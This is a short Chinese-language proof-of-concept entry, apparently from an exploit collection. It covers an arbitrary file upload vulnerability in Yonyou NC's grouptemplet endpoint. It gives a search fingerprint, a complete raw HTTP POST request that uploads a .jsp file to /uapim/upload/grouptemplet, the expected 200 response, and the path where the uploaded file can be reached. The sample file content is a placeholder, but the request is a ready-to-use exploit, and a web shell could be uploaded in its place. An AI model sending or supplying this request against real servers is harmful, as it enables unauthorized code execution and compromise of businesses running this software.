﻿# 用友 NC grouptemplet  文件上传漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：

> 漏洞特征： title="YONYOU NC"

> 验证脚本：HTTP

```
POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ

------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="dudesite.jsp"
Content-Type: application/octet-stream

111111111111111111111
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/uapim/static/pages/nc/

> 验证文件来源：用友 NC grouptemplet  文件上传漏洞.poc

